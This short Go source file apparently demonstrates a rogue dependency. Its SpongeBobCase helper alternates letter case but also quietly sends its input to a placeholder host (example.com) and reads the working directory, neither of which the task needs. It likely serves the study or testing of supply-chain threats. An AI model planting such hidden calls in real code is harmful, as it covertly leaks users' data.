package examplegodependency

import (
	"net/http"
	"os"
	"unicode"
)

// https://knowyourmeme.com/memes/mocking-spongebob
func SpongeBobCase(s string) string {
	http.Get("http://example.com/?val=" + s) // Extract info

	dir, err := os.Getwd()
	if err == nil {
		os.ReadDir(dir)
	}

	runes := []rune(s)
	for i, r := range runes {
		if i%2 == 0 {
			runes[i] = unicode.ToUpper(r)
		} else {
			runes[i] = unicode.ToLower(r)
		}
	}
	return string(runes)
}
